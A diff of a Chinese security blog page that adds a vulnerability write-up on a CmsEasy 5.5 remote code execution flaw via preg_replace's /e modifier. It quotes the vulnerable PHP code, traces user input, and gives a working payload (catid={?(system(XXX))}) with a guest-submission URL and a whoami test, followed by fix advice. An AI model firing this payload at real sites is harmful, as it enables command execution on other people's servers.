@@ -6,19 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://showmeshell.top">
-  <title>Archives: 2018/12 | Esther-Cheung And ShowMeShell&#39;s Blog</title>
+  <title>CmsEasy 5.5 代码执行漏洞 | Esther-Cheung And ShowMeShell&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="The Road Of Reverse And Web~">
-<meta name="keywords" content="Security">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:url" content="http://showmeshell.top/archives/2018/12/index.html">
+  <meta name="description" content="漏洞介绍CmsEasy 是一款基于 PHP+Mysql 架构的网站内容管理系统，也是一个PHP开发平台。 采用模块化方式开发，功能易用便于扩展，可面向大中型站点提供重量级网站建设解决方案。 漏洞介绍 本次漏洞的根源产生在PHP函数preg_replace上，攻击者可以通过构造语句，达到任意代码执行的目的。 影响范围 CmsEasy 5.5 20130716 漏洞危害 成功利用该漏洞后，攻击者可以远">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CmsEasy 5.5 代码执行漏洞">
+<meta property="og:url" content="http://showmeshell.top/2018/12/02/CmsEasy-5-5-代码执行漏洞/index.html">
 <meta property="og:site_name" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:description" content="The Road Of Reverse And Web~">
+<meta property="og:description" content="漏洞介绍CmsEasy 是一款基于 PHP+Mysql 架构的网站内容管理系统，也是一个PHP开发平台。 采用模块化方式开发，功能易用便于扩展，可面向大中型站点提供重量级网站建设解决方案。 漏洞介绍 本次漏洞的根源产生在PHP函数preg_replace上，攻击者可以通过构造语句，达到任意代码执行的目的。 影响范围 CmsEasy 5.5 20130716 漏洞危害 成功利用该漏洞后，攻击者可以远">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-12-02T07:09:37.107Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta name="twitter:description" content="The Road Of Reverse And Web~">
+<meta name="twitter:title" content="CmsEasy 5.5 代码执行漏洞">
+<meta name="twitter:description" content="漏洞介绍CmsEasy 是一款基于 PHP+Mysql 架构的网站内容管理系统，也是一个PHP开发平台。 采用模块化方式开发，功能易用便于扩展，可面向大中型站点提供重量级网站建设解决方案。 漏洞介绍 本次漏洞的根源产生在PHP函数preg_replace上，攻击者可以通过构造语句，达到任意代码执行的目的。 影响范围 CmsEasy 5.5 20130716 漏洞危害 成功利用该漏洞后，攻击者可以远">
   
     <link rel="alternative" href="/atom.xml" title="Esther-Cheung And ShowMeShell&#39;s Blog" type="application/atom+xml">
   
@@ -148,36 +149,128 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-CmsEasy-5-5-代码执行漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      CmsEasy 5.5 代码执行漏洞
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/02/CmsEasy-5-5-代码执行漏洞/" class="archive-article-date">
+
+        
+        <a href="/2018/12/02/CmsEasy-5-5-代码执行漏洞/" class="archive-article-date">
   	<time datetime="2018-12-02T07:08:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-02</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/02/CmsEasy-5-5-代码执行漏洞/">CmsEasy 5.5 代码执行漏洞</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p><strong>CmsEasy</strong></p>
+<p>是一款基于 PHP+Mysql 架构的网站内容管理系统，也是一个PHP开发平台。 采用模块化方式开发，功能易用便于扩展，可面向大中型站点提供重量级网站建设解决方案。</p>
+<p><strong>漏洞介绍</strong></p>
+<p>本次漏洞的根源产生在PHP函数preg_replace上，攻击者可以通过构造语句，达到任意代码执行的目的。</p>
+<p><strong>影响范围</strong></p>
+<p>CmsEasy 5.5 20130716</p>
+<p><strong>漏洞危害</strong></p>
+<p>成功利用该漏洞后，攻击者可以远程任意代码执行，直接调用服务器命令终端，执行任意命令，直接威胁到服务器的安全。</p>
+<p><strong>代码执行漏洞</strong></p>
+<p>用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞的根源出现在PHP函数<code>preg_replace</code> 上，首先来了解一下这个函数：</p>
+<p>这个函数的作用是执行正则表达式的搜索和替换，它的语法如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</span><br></pre></td></tr></table></figure>
+<ul>
+<li>参数 pattern 代表正则表达式</li>
+<li>参数 replacement表示替换的内容</li>
+<li>参数 subject表示需要匹配替换的对象</li>
+<li>参数 limit 则表示指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换。</li>
+</ul>
+<p>重点在于pattern参数，可以使用一些PCRE修饰符，包括被启用的<code>e(PREG_REPLACE_EVAL)</code>，接下来再来了解一下这个函数的危害：</p>
+<p>这个函数从PHP5.5以后已经废弃，官方建议不要使用本特性。</p>
+<p>函数<code>preg_replace</code>在进行了对替换字符串的过滤和验证后，<strong>会将替换后的字符串作为PHP代码执行返回。</strong></p>
+<p>了解了这个函数的危害后，下面具体分析代码：</p>
+<p>在<code>lib/tool/form.php</code> 中，漏洞代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getform</span><span class="params">($name,$form,$field,$data)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (get(<span class="string">'table'</span>) &amp;&amp;<span class="keyword">isset</span>(setting::$var[get(<span class="string">'table'</span>)][$name]))</span><br><span class="line">           $form[$name]=setting::$var[get(<span class="string">'table'</span>)][$name];</span><br><span class="line">       <span class="keyword">if</span> (get(<span class="string">'form'</span>) &amp;&amp;<span class="keyword">isset</span>(setting::$var[get(<span class="string">'form'</span>)][$name]))</span><br><span class="line">           $form[$name]=setting::$var[get(<span class="string">'form'</span>)][$name];</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>($form[$name][<span class="string">'default'</span>]))</span><br><span class="line">           $form[$name][<span class="string">'default'</span>]=preg_replace(<span class="string">'/\&#123;\?([^&#125;]+)\&#125;/e'</span>,<span class="string">"eval('return $1;')"</span>,$form[$name][<span class="string">'default'</span>]);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[$name]) &amp;&amp;<span class="keyword">isset</span>($form[$name][<span class="string">'default'</span>]))</span><br><span class="line">           $data[$name]=@$form[$name][<span class="string">'default'</span>];</span><br><span class="line">       <span class="keyword">if</span> (preg_match(<span class="string">'/templat/'</span>,$name) &amp;&amp;<span class="keyword">empty</span>($data[$name]))</span><br><span class="line">           $data[$name]=@$form[$name][<span class="string">'default'</span>];</span><br><span class="line">       <span class="keyword">if</span> (@$form[$name][<span class="string">'filetype'</span>] == <span class="string">'image'</span>) &#123;</span><br><span class="line">           $return=form::upload_image($name,front::post($name) ?front::post($name) : @$data[$name]);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<p>系统定义了 getform函数，问题在函数的第三个if语句下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$form[$name][<span class="string">'default'</span>]=preg_replace(<span class="string">'/\&#123;\?([^&#125;]+)\&#125;/e'</span>,<span class="string">"eval('return $1;')"</span>,$form[$name][<span class="string">'default'</span>]);</span><br></pre></td></tr></table></figure>
+<p>我们可以看到，要替换的内容为<code>form[$name][&#39;default&#39;]</code> ，根据以上的分析，可以得知，如果可以让我们控制替换内容的字符串内容，在替换的时候，就会发生代码执行。</p>
+<p>因此现在的关键点在于，寻找一个<code>form[$name][&#39;default&#39;]</code> 的用户控制点。</p>
+<p>在<code>lib/table/archive.php</code> 中我们找到了用户可控点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_form</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">             <span class="string">'catid'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                     <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                     <span class="string">'select'</span>=&gt;form::arraytoselect(category::option(<span class="number">0</span>,<span class="string">'tolast'</span>)),</span><br><span class="line">                     <span class="string">'default'</span>=&gt;intval(get(<span class="string">'catid'</span>)),</span><br><span class="line">                     <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                     <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">             ),</span><br><span class="line">             <span class="string">'typeid'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                     <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                     <span class="string">'select'</span>=&gt;form::arraytoselect(type::option(<span class="number">0</span>,<span class="string">'tolast'</span>)),</span><br><span class="line">                     <span class="string">'default'</span>=&gt;intval(get(<span class="string">'typeid'</span>)),</span><br><span class="line">                     <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                     <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">             ),</span><br><span class="line"> <span class="string">'toppost'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                     <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                     <span class="string">'select'</span>=&gt;form::arraytoselect(<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">'不置顶'</span>,<span class="number">2</span>=&gt;<span class="string">'栏目置顶'</span>,<span class="number">3</span>=&gt;<span class="string">'全站置顶'</span>)),</span><br><span class="line">                     <span class="string">'default'</span>=&gt;<span class="number">0</span>,</span><br><span class="line">                     <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                     <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">             ),</span><br></pre></td></tr></table></figure>
+<p>定义了一个get_form 这个函数，返回一个数组，其中catid数组中，可以看到default通过传参获取内容，用户可以进行控制。</p>
+<p>接下来看看catid和getform是怎么配合使用的？</p>
+<p>查看文件<code>template\default\manage\guestadd.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[removed]</span><br><span class="line">&#123;lang(addcategory)&#125;           &#123;form::getform('catid',$form,$field,$data)&#125;</span><br><span class="line">&#123;lang(addtype)&#125;           &#123;form::getform('typeid',$form,$field,$data)&#125;</span><br><span class="line">&#123;lang(title)&#125;           &#123;form::getform('title',$form,$field,$data)&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，在模板中直接调用了getform函数，然后传递了catid参数。</p>
+<p>通过回朔追踪追踪，得知<code>guestadd.html</code> 是由<code>guesttadd_action</code>函数来控制的，而这个函数的在<code>lib\default\manage_act.php</code> 中，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'ROOT'</span>)) <span class="keyword">exit</span>(<span class="string">'Can\'t Access !'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">manage_act</span> <span class="keyword">extends</span> <span class="title">act</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $_table;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $user=<span class="string">''</span>;</span><br><span class="line">        $guest = front::get(<span class="string">'guest'</span>);</span><br><span class="line">        <span class="keyword">if</span>($guest==<span class="string">'1'</span>&amp;&amp;config::get(<span class="string">'opguestadd'</span>)) &#123;</span><br><span class="line">            $user = <span class="string">'Guest'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(cookie::get(<span class="string">'login_username'</span>) &amp;&amp;cookie::get(<span class="string">'login_password'</span>)) &#123;</span><br><span class="line">                $user=<span class="keyword">new</span> user();</span><br><span class="line">                $user=$user-&gt;getrow(<span class="keyword">array</span>(<span class="string">'username'</span>=&gt;cookie::get(<span class="string">'login_username'</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cookie::get(<span class="string">'login_username'</span>) &amp;&amp;cookie::get(<span class="string">'login_password'</span>)) &#123;</span><br><span class="line">            $guestuser=<span class="keyword">new</span> user();</span><br><span class="line">            $guestuser=$guestuser-&gt;getrow(<span class="keyword">array</span>(<span class="string">'username'</span>=&gt;cookie::get(<span class="string">'login_username'</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;guestuser = $guestuser;</span><br><span class="line">        <span class="keyword">if</span>(!$user &amp;&amp;front::$act != <span class="string">'login'</span>&amp;&amp;front::$act != <span class="string">'register'</span>)  front::redirect(url::create(<span class="string">'user/login'</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;user=$user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_user=<span class="keyword">new</span> user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table=front::get(<span class="string">'manage'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;table &lt;&gt;<span class="string">'archive'</span>&amp;&amp;<span class="keyword">$this</span>-&gt;table &lt;&gt;<span class="string">'orders'</span>) <span class="keyword">exit</span>(<span class="string">'PAGE NOT FOUND!'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_table=<span class="keyword">new</span> <span class="keyword">$this</span>-&gt;table;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_table-&gt;getFields();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;form=<span class="keyword">$this</span>-&gt;_table-&gt;get_form();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pagesize=config::get(<span class="string">'manage_pagesize'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;manage=<span class="keyword">$this</span>-&gt;table;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;primary_key=<span class="keyword">$this</span>-&gt;_table-&gt;primary_key;</span><br><span class="line">        <span class="keyword">if</span>(!front::get(<span class="string">'page'</span>)) front::$get[<span class="string">'page'</span>]=<span class="number">1</span>;</span><br><span class="line">        $manage=<span class="string">'table_'</span>.<span class="keyword">$this</span>-&gt;table;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;manage=<span class="keyword">new</span> $manage;</span><br></pre></td></tr></table></figure>
+<p>在其第29行有如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;view-&gt;form=<span class="keyword">$this</span>-&gt;_table-&gt;get_form();</span><br></pre></td></tr></table></figure>
+<p>把模板里面的变量form赋值成为this中table下的get_form，就是在这里调用之前返回数组的函数。</p>
+<p><strong>总结：</strong></p>
+<p>首先是manage_act.php，它是控制器的一个文件，初始化之后，它回去调用guestadd_action()，执行完数据后，再传递给guestadd.html，进行渲染。</p>
+<p>manage_act.php在调用guestadd_action()之前，首先会初始化init()，init()会调用get-form()，而get-form会调用catid这个数组，这里我们就可以对catid进行控制。</p>
+<p>接下来catid会传递到 $this-&gt;view-&gt;form 这个变量里去，并再次调用getform这个函数，将catid传递进来。最后进行了正则过滤，这里也就是重点，从而会导致系统将我们传入的字符串通过preg_replace来执行出php代码的效果。</p>
+<p>最终payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catid=&#123;?(system(XXX))&#125;</span><br></pre></td></tr></table></figure>
+<p>其中XXX代表我们要执行的命令。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>打开浏览器，访问目标站点，在首页点击网页底部的游客投稿。</p>
+<p><code>http://www.test.ichunqiu/?case=manage&amp;act=guestadd&amp;manage=archive&amp;guest=1</code></p>
+<p>接下来点击<code>Enable Post data</code> ，使用Post方式发送恶意数据包，将payload写入数据框，点击提交。</p>
+<p><code>catid={？(system(whoami))}</code></p>
+<p>或者<code>typeid</code></p>
+<p>提交了whoami命令，在所属栏目一项，系统已经执行了命令，显示当前用户为system。</p>
+<h3 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h3><p>代码执行漏洞相比较其他的漏洞，如Sql注入，XSS，包含漏洞等，危害更大，一旦执行成功，甚至可以直接拿下服务器的权限，因此根据之前的学习，对漏洞的修复应注意以下几点：</p>
+<ul>
+<li>所有输入都是可疑的，尝试对所有输入提交可能执行命令的构造语句进行严格的检查或者控制外部输入，系统命令执行函数的参数不允许外部传递。</li>
+<li>不仅要验证数据的类型，还要验证其格式、长度、范围和内容。</li>
+<li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li>
+<li>对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。</li>
+</ul>
+<p><strong>修复建议</strong></p>
+<p>升级版本即可</p>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/zhifubao.jpeg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/weixin.jpeg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -189,57 +282,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://showmeshell.top/2018/12/02/CmsEasy-5-5-代码执行漏洞/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/02/PHPCMS-2008-命令执行漏洞/" class="archive-article-date">
-  	<time datetime="2018-12-02T06:23:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-02</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/12/02/PHPCMS-2008-命令执行漏洞/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PHPCMS 2008 命令执行漏洞</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/02/PHPCMS-2008-命令执行漏洞/">PHPCMS 2008 命令执行漏洞</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -276,8 +418,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
